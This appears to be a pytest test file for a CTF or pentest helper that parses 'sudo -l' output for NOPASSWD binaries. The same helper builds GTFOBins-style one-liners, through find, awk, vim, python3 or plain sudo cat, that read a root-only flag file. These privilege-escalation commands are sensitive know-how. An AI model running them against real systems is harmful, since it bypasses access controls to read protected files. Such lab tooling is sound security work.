from grin.tools.sudoesc import gtfo_read, parse_nopasswd


def test_parse_nopasswd_extracts_binaries():
    out = """Matching Defaults entries for www-data-svc on chain:
    env_reset, mail_badpass

User www-data-svc may run the following commands on chain:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/vim, /usr/bin/awk"""
    bins = parse_nopasswd(out)
    assert "/usr/bin/find" in bins
    assert "/usr/bin/vim" in bins
    assert "/usr/bin/awk" in bins


def test_parse_nopasswd_ignores_password_required_entries():
    out = ("User x may run the following commands on h:\n"
           "    (root) /usr/bin/systemctl\n"            # no NOPASSWD -> needs a password, skip
           "    (root) NOPASSWD: /usr/bin/less")
    bins = parse_nopasswd(out)
    assert bins == ["/usr/bin/less"]


def test_parse_nopasswd_all_is_total_ownage():
    out = "User x may run the following commands on h:\n    (ALL) NOPASSWD: ALL"
    assert parse_nopasswd(out) == ["ALL"]


def test_gtfo_read_known_binaries_build_a_root_read():
    # each returns a shell command that reads the flag AS ROOT via that sudo binary
    assert gtfo_read("/usr/bin/find", "/root/flag.txt") == \
        "sudo /usr/bin/find /root/flag.txt -exec cat {} \\;"
    assert "cat /root/flag.txt" in gtfo_read("/usr/bin/awk", "/root/flag.txt")
    assert "cat /root/flag.txt" in gtfo_read("/usr/bin/python3", "/root/flag.txt")
    assert "cat /root/flag.txt" in gtfo_read("/usr/bin/vim", "/root/flag.txt")
    # ALL = run cat directly as root
    assert gtfo_read("ALL", "/root/flag.txt") == "sudo cat /root/flag.txt"


def test_gtfo_read_uses_basename_so_path_variants_match():
    # /bin/awk and /usr/bin/awk are the same gadget
    assert gtfo_read("/bin/awk", "/root/flag.txt") is not None


def test_gtfo_read_unknown_binary_is_none():
    assert gtfo_read("/usr/sbin/nginx", "/root/flag.txt") is None
